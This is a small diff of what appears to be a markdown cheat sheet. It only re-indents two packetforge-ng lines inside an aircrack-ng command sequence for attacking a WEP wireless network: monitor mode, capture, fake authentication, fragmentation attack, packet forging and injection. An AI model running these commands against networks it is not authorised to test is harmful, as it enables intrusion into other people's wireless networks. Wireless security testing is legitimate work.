@@ -28,7 +28,7 @@ airmon-ng start <interface> <AP channel>
 airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
 aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
 aireplay-ng -5 -b <AP MAC> -h <Our MAC> <interface>
-packetforge-ng -0 -a <AP MAC> -h <Your MAC> -k <Dest IP> -l <Source IP> -y <xor file> -w <output file>
-packetforge-ng --null -s 42 -a <AP MAC> -h <Source MAC> -w <output filename> -y <PRGA filename>
+    packetforge-ng -0 -a <AP MAC> -h <Your MAC> -k <Dest IP> -l <Source IP> -y <xor file> -w <output file>
+    packetforge-ng --null -s 42 -a <AP MAC> -h <Source MAC> -w <output filename> -y <PRGA filename>
 aireplay-ng -2 -r packet.cap mon0
 ```
